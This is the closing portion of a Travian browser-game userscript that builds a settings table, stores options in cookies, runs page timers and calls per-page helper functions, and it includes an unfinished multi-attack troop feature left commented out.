			'<a href="http://img74.imageshack.us/img74/8568/travianaidepersofm0.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://i152.photobucket.com/albums/s199/Vud-Mannerd/Travian/NPC.jpg" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img220.imageshack.us/img220/5948/rp1zq1.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img291.imageshack.us/img291/1701/rp2ua1.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img391.imageshack.us/img391/7435/rp4vd6.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img300.imageshack.us/img300/1594/rp3va7.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>'
		];

		for (var i = 0; i < parametros.length; i++)
		{
			fila = $elem("TR");
			fila.appendChild($elem("TD", parameterDescriptions[i]));
			fila.appendChild($elem("TD", parameterDescriptionsAide[i]));
			var valor = readCookie(parametros[i]) ?  'checked="checked"' : '';
			fila.appendChild($elem("TD", "<input type='checkbox' name='" + parametros[i] + "' " + valor + " class='fm' />")); // Modif largeur colonne ligne 5842 (pas defaut : 300)
			tabla.appendChild(fila);
		}

		var fila = $elem("TR");
		var td = $elem("TD", T('TBH_SETUP_T'), {
			"class": "rbg",
			"colspan": 3
		}, {}, fila);
		tabla.appendChild(fila);

		// Parametros reconocidos
		var parametros = ["capital" + server + userID, "nbunit1" + server, "ally1" + server, "notas_" + server, "ventas_" + server, "marcadores_" + server];
		var parameterDescriptions = [T('TAB28'), T('TAB35'), "<font color=#808000>" + T('TAB1') + "</font>", "<font color=#DA70D6>" + T('TAB3') + "</font>", T('TAB4'), T('TAB2')];
		var parameterDescriptionsAide =
		[
			'<a href="http://i152.photobucket.com/albums/s199/Vud-Mannerd/Travian/CapitalID.jpg" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',	//pictures from napkin
			'<a href="http://img375.imageshack.us/img375/9554/popupswl9.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img92.imageshack.us/img92/2118/travianstatmaptextefz9.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img388.imageshack.us/img388/1412/travianaidenotepadtextesp9.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img209.imageshack.us/img209/6470/travianmarchpy2.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img393.imageshack.us/img393/3429/travianlienqw5.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>'
		];

		for (var i = 0; i < parametros.length; i++)
		{
			fila = $elem("TR");
			fila.appendChild($elem("TD", parameterDescriptions[i]));
			fila.appendChild($elem("TD", parameterDescriptionsAide[i]));
			var valor = readCookie(parametros[i]);
			fila.appendChild($elem("TD", "<input type='text' name='" + parametros[i] + "' value='" + (valor != null ? valor : '') + "' class='fm' style='width:100px;'/>")); // Modif largeur colonne ligne 5842 (pas defaut : 300)
			tabla.appendChild(fila);
		}

		insertAfter(a, tabla);

		var imagen = $elem("IMG", "", {"src": img('b/s1.gif', true)});
		imagen.addEventListener("click", function()
		{
			var parametros = $tags('input', get('configuracion'));
			for (var i = 0; i < parametros.length - 1; i++)
			{
				if(parametros[i].type == 'text')
					createCookie(parametros[i].name, parametros[i].value, 365);
				else
					createCookie(parametros[i].name, parametros[i].checked, 365);
			}
			createCookie(parametros[parametros.length - 1].name, parametros[parametros.length - 1].value, 365); //checked
			alert(T('GUARDADO'));
		}, 0);
		var p = $elem("P", '', {
			"class": "rbg",
			"colspan": 3,
			'align': 'center'
		}, {});
		p.appendChild(imagen);
		insertAfter(tabla, p);
		var uTable = get('resumen');
		var mapTable = get('tabla_mapa');
		if (uTable != null) {
			uTable.style.visibility = "hidden";
		} else if (mapTable != null) {
			mapTable.style.visibility = "hidden";
		}
	}

	//set up timers on page load
	function setTravianTimers()
	{
		for (var i = 1;; i++)
		{ //store the start time in ms for all incremental timers // 	stocker l'heure de démarrage en ms progressive pour tous les temps
			var myElement = get("tp" + i);
			if (myElement != null)
			{
				var p = myElement.innerHTML.split(":");
				plustimers["tp" + i] = (parseInt(p[0], 10) * 3600 + parseInt(p[1], 10) * 60 + parseInt(p[2], 10)) * 1000;
			}
			else
				break;
		}

		for (var i = 1;; i++)
		{ //store end time in ms for all decremental timers // fin le magasin en ms pour tous les temps decremental
			var myElement = get("timer" + i);
			if (myElement != null)
			{
				var p = myElement.innerHTML.split(":");
				var endtime = (parseInt(p[0], 10) * 3600 + parseInt(p[1], 10) * 60 + parseInt(p[2], 10)) * 1000;
				minustimers["timer" + i] = endtime + pageloadtime.getTime();
			}
			else
				break;
		}

		setInterval(t_timers(), 250); //call our timer // notre appel à rebours
	}

	//this increments/decrements timers relative to your system clock // ca augmentations / diminution le timer  par rapport à votre système d'horloge
	function t_timers()
	{
		return function()
		{
			var now = new Date();
			for (var i in plustimers)
			{
				var newtime = now.getTime() - pageloadtime.getTime() + plustimers[i];
				newtime = (newtime > 86400000) ? newtime - 86400000 : newtime;
				var hours = Math.floor(newtime / 3600000);
				newtime -= hours * 3600000;
				var mins = Math.floor(newtime / 60000);
				newtime -= mins * 60000;
				var secs = Math.floor(newtime / 1000);
				get(i).innerHTML = hours + ':' + padlength(mins) + ':' + padlength(secs);
			}

			for (var i in minustimers)
			{
				var newtime = minustimers[i] - now.getTime();
				if (newtime > 0)
				{
					var hours = Math.floor(newtime / 3600000);
					newtime -= hours * 3600000;
					var mins = Math.floor(newtime / 60000);
					newtime -= mins * 60000;
					var secs = Math.floor(newtime / 1000);
					get(i).innerHTML = hours + ':' + padlength(mins) + ':' + padlength(secs);
				}
				if (minustimers[i] <= now.getTime() && in_reload == 0)
				{
					in_reload = 1;
					document.location.reload();
				}
			}
		}
	}

	function padlength(d)
	{
		return (d.toString().length == 1) ? "0" + d : d
	}

	/* Acciones generales a todas las paginas */
	getGeneralData();
	sanearEnlaces();
	hideAd();
	loadImage(); // Images du script
	if(document.location.href.indexOf('karte2') == -1)
	{
		lonelyTown();
		quickLinks();
		buildingLinks();
		menulink();
		calculateFillTime();
		mostrarMarcadores();		
	}
	if (location.href.match(/gid=16/) != -1 || location.href.match(/id=39/) != -1)
		QP_addOwnTownTotalTroopsTable();
	cityLinks(); // Il crée des liaisons directes dans la liste de villages pour envoyer des troupes ou envoyer des commerçants
	borrarCuenta();
	confirmDelete();
	checkUpdate();
	playerLinks(); //Liens stats
	crearTooltip(); //popup général
	unitStats(); //popup unités

	/* Actions configurable par "mostrarConfiguracion" */
	infosiege = readCookie("infosiege" + server);
	if (infosiege == true || infosiege == null)
		if (location.href.indexOf('dorf1') != -1)
		resumenAldeasT();
	infosiege2 = readCookie("infosiege2" + server);
	if (infosiege2 == true || infosiege2 == null)
		if (location.href.indexOf('dorf2') != -1)// || location.href.indexOf('build.php?newdid=') != -1)
		resumenAldeasT();
	TQR1 = readCookie("TQR1" + server);
	if (TQR1 == false || TQR1 == null)
		{}else
		{
			if (location.href.match(/nachrichten\.php($|\?t=2|\?t=3)/))
			{
				var urlResult = URLX.NACHRICHTEN;
				TQR();
			}
		}
	TQR2 = readCookie("TQR2" + server);
	if (TQR2 == false || TQR2 == null)
		{}else
		{
			if (location.href.match(/berichte.php($|\?t=)/))
			{
				var urlResult = URLX.BERICHTE;
				TQR();
			}
		}
	TQR3 = readCookie("TQR3" + server);
	if (TQR3 == false || TQR3 == null)
		{}else
		{
			if (location.href.match(/allianz.php\?s=3/))
			{
				var urlResult = URLX.ALLIANZ;
			    TQR();
			}
		}
	TQR4 = readCookie("TQR4" + server);
	if (TQR4 == false || TQR4 == null)
		{}else
		{
			if (location.href.match(/karte\.php(\?d=|\?newdid)/))
			{
				var urlResult = URLX.KARTE;
			    TQR();
			}
		}

	/* Acciones especificas para algunas paginas */
	if (plus)
		var travplus = 1;
	if (location.href.indexOf('dorf1') != -1)
		preCalculate1();
	if (location.href.indexOf('dorf2') != -1)// || location.href.indexOf('build.php?newdid=') != -1)
	{
		preCalculate2();
		ShowCenterNumbers();
	}
	if (location.href.indexOf('build.php?') != -1)
	{
		quickCity();
		recursosMercado(); //marchant capacité
		updateMerchantTotal();
	}
	if (location.href.indexOf('build.php') != -1)
	{
		if (location.href.match(/build\.php\?id=\d+(&s=\d+|&t=\d+)/) == null)
			NPC_Helper_Init();
		tiempoExplorarUnidades();
		tiempoExplorar();
		mostrarVentas();
		calculateBuildTime();
		heroStatus();
	}
	if (location.href.match(/build\.php\?(.*)&s=2/))
		puntosCultura();
	if (location.href.match(/build\.php\?(.*)&t=1/))
	{
		alianzaMercado();
		filtrosMercado();
	}
	if (location.href.indexOf('a2b.php') != -1)
	{
		quickCity();
		ataqueDefecto();
		createMultiAttack_TEST();
		genreporta2b();
		document.addEventListener('keyup',a2b,false);
		document.addEventListener('click',a2b,false);
	}
	if (location.href.indexOf('allianz.php') != -1)
	{	//opcionOcultaAlianza();
		BBcodedProfile();
	}
	if (location.href.indexOf('nachrichten.php') != -1)
	{
		opcionOcultaMensajes();
		igmlinks();
	}
	if (location.href.indexOf('berichte.php') != -1)
		opcionOcultaInformes();
	if (location.href.match(/berichte\.php\?(.*&)?id=/))
	{
		reportBatalla();
		parseBattleAnalyse();
	}
	if (location.href.match(/nachrichten\.php($|\?t=|\?s=)/) || location.href.match(/berichte.php($|\?t=|\?s=|\?n1=)/))
		opcionesMensajes();
	if (location.href.match(/nachrichten\.php($|\?t=|\?s=)/))
	{
		archiveIGM();
		BBcodeHelp();
	}
	if (location.href.match(/karte\.php($|\?z=|\?new)/))
	{
		infoRecursos();
		installMapEventHandler();
		createTooltip1();
		installMapEventHandler1();
	}
	if (location.href.match(/karte2\.php($|\?z=|\?new)/))
	{
		createTooltip1();
		installMapEventHandler2();
	}
	if (location.href.match(/karte\.php($|\?d=)/))
	{
		MapaQuickSave();
		copyNatureInOasis();
	}
	if (location.href.match(/gid=14/))
	{
		procesarPT(); //test table calc time	
	}
	if (location.href.indexOf('warsim.php') > -1)
	{	parseBattleAnalyse();
		pasteInWarsim();
	}
	if (location.href.match(/spieler\.php($|\?uid=)/))
		BBcodedProfile();
	if (location.href.match(/spieler\.php\?(.*&)?s=2/))
		mostrarConfiguracion();
	if (location.href.indexOf('statistiken.php') > -1)
	{
		try
		{
			find("//input[@name='spieler']", XPFirst).focus();
		}
		catch (e)
		{
		}
	} //TMR
	if (location.href.match(/dorf3.php($|\?newdid=(\d+)$)/))
		resumenAldeas(); // global
	if (location.href.match(/dorf3.php\?(?:newdid=\d+&)?s=(\d+)/))
		switch (RegExp.$1){
			case '0': resumenAldeas3(); break;	// mini
			case '1': resumenAldeas5(); break;	// pc
			case '2': resumenAldeas2(); break;	// dépot
			case '3': resumenAldeas6(); break;	// ressource
			case '4': resumenAldeas8(); break;	// manoir
			case '5': resumenAldeas4(); break;	// troupes
			case '6':
			case '7': resumenAldeas7(); break;	// fete
			case '8':
			case '9': resumenAldeasT(); break;	// +
		}

	/* Mas acciones generales */
	if (getOption("starttimers", true, "boolean"))
		setTimers();
	fix_title();
	setTravianTimers();
	if(document.location.href.indexOf('karte2') == -1)
		calcularTiempoEjecucion();

	/**----------------------------------------------------------------- 
	* FUNCTIONS BELOW HERE ARE STILL IN DEVELOPMENT
	* lvl Place de tournoi 
	**/
	function procesarPT()
	{ajaxRequest
		("build.php?gid=14", 'GET', null, function(AJAXrespX)
			{
				var aDoc = document.implementation.createDocument("", "", null);
				var aElem = document.createElement('DIV');
				aElem.innerHTML = AJAXrespX.responseText;
				aDoc.appendChild(aElem);
				// lvl PT
				var a = aDoc.evaluate("//div[@id='lmid2']//b", aElem, null, XPFirst, null).singleNodeValue;
				if (a)
				{	lvlpdt = a.innerHTML.split(T('LVL'))[1].split("</b>")[0];
				}else
				{	lvlpdt = 0;
				}
				GM_setValue(server + id_aldea + 'lvlpdt', lvlpdt);
			}
		);
	}
	/**-----------------------------------------------------------------*/

	/**
	*  FUNCTIONS BELOW HERE ARE STILL IN DEVELOPMENT
	*  NOW WORKING ON MULTI ATTACKS SIMULTANEOUSLY - A_r_e_s
	*
	**/
	function getAvailableTroops()
	{
		var troopsAvailable = new Array();
		var troops = find("//div[@id='lmid2']//table[@class='p1' and @id='attackTable_0']//table[@class='f10']//td[contains(@class, 'f8')]", XPList);
		if(!troops)
			return alert('Troops table could not be found.');


		for(var i = 0; i < troops.snapshotLength; i++)
			if(troops.snapshotItem(i).tagName.toLowerCase() == "b")
				troopsAvailable.push(0);
			else
				troopsAvailable.push(parseInt(troops.snapshotItem(i).childNodes[0].innerHTML.replace('(','').replace(')','')));
		return troopsAvailable;
	}

	function createMultiAttack_TEST()
	{
		//return; // This function is not finished yet
		/*
		var troopsAvailable = getAvailableTroops();

		var complementFormFieldsType = find("//div[@id='lmid2']//table[@class='f10']//div[@class='f10']//input", XPList);
		var complementFormFieldsTo = find("//div[@id='lmid2']//table[@class='f10']//div[contains(@class, 'f135')]//input", XPList);

		find("//div[@id='lmid2']//table[@class='p1']", XPFirst).setAttribute('id', 'attackTable_0');

		//console.log(complementFormFieldsType.snapshotLength);
		//console.log(complementFormFieldsTo.snapshotLength);
		stateAttack(0,0);
		createAddAttackButton();
		replaceFirstSendButton();


		function confirmMultiTroops()
		{
			if(!checkTroopsQuantity())
				return alert('You are trying to send more troops than you have.');


			//ajaxRequest(url, method, param, onSuccess, onFailure)
			var attackNumber = getNumberOfAttacks();
			var fieldNames = new Array(1,4,7,9,2,5,8,10,3,6); // Ids of the field names in order of find command
			for(var i = 0; i < attackNumber; i++)
			{
				var param = {};
				var attackTroops = getTroopsFromTable(i);
				for(var j = 0, len = attackTroops.length; j < len; j++)
					param['t'+fieldNames[j]] = attackTroops[j];

				console.log(param);
			}
			//ajaxRequest(document.location.href, )

		}


		function checkTroopsQuantity()
		{
			var troopsQuantity = new Array(0,0,0,0,0,0,0,0,0,0);

			var attackNumber = getNumberOfAttacks();
			for(var i = 0; i < attackNumber; i++)
			{
				var tableTroops = getTroopsFromTable(i);
				for(var j = 0, len = tableTroops.length; j < len; j++)
					troopsQuantity[j] += tableTroops[j];
			}

			var troopsAvailable = getAvailableTroops();
			for(var i = 0, len = troopsQuantity.length; i < len; i++)
				if(troopsQuantity[i] > troopsAvailable[i])
					return false;
			return true;
		}

		function getTroopsFromTable(attackNumber)
		{
			var tableTroops = new Array();
			var xPath = find("//div[@id='lmid2']//table[@class='p1' and @id='attackTable_"+attackNumber+"']//table[@class='f10']//input[@class='fm']", XPList);
			for(var i = 0; i < xPath.snapshotLength; i++)
			{
				var value = xPath.snapshotItem(i).value;
				tableTroops.push( value.length ? parseInt(value) : 0 );
			}
			return tableTroops;
		}

		function getNumberOfAttacks()
		{
			var xPath = find("//div[@id='lmid2']//table[@class='p1']", XPList);
			return xPath.snapshotLength;
		}

		function getAttackTable(attackNumber)
		{
			try
			{
				return get('attackTable_' + attackNumber);
			}
			catch (e)
			{
				return alert('Could not find attack number: ' + attackNumber);
			}
		}


		function stateAttack(stateId, attackNumber)
		{
			var tmpStr = '';
			switch(stateId)
			{
				case 1: tmpStr = '<font color="red">Confirmed with these troops</font>'; break;
				case 2: tmpStr = '<font color="blue">Sending...</font>'; break;
				case 3: tmpStr = '<font color="green">Sent</font>'; break;
				case 4: tmpStr = '<font color="red">Send Failed</font>'; break;
				default: tmpStr = '<font color="red">Not Sent</font>'; break;
			}
			var tableTr = find("//div[@id='lmid2']//table[@class='p1' and @id='attackTable_"+attackNumber+"']//tr", XPFirst);

			$elem('td', '<font color="red">Not Sent</font>',{}, {}, tableTr);
		}

		function replaceFirstSendButton()
		{
			var sendButton = find("//div[@id='lmid2']//input[@type='image' and @value='ok']", XPFirst);
			var src = sendButton.getAttribute('src');
			var parentSend = sendButton.parentNode;

			while(parentSend.childNodes.length)
				parentSend.removeChild(parentSend.childNodes[0]);

			var img = $elem('img','',{'src':src, 'border':'0'},{},parentSend);

			img.addEventListener('click', confirmMultiTroops, 0);
		}

		function createAddAttackButton()
		{
			var createAttackButton = $elem('a', ' + Add Attack Block', {'href':'javascript:void(0);'},{}, get('lmid2').childNodes[0]); //TEMP -- CHANGE LATER
			createAttackButton.addEventListener("click", function()
			{
				var numAttacks = getNumberOfAttacks();
				var oldTable = getAttackTable(numAttacks-1);
				var newTableContent = oldTable.innerHTML;
				var newTable = $elem('table', newTableContent, {'id': 'attackTable_'+(numAttacks),  'class':'p1', 'cellspacing':'1', 'cellpadding':'0'}, {'width':'100%'});
				var br = $elem('br');
				insertAfter(oldTable, br);
				insertAfter(br, newTable);
			},0);
		}

		//*/
	}

};

if (window.addEventListener)
	window.addEventListener( 'load', funcionPrincipal, false);
else
	window.attachEvent( 'onload', funcionPrincipal);
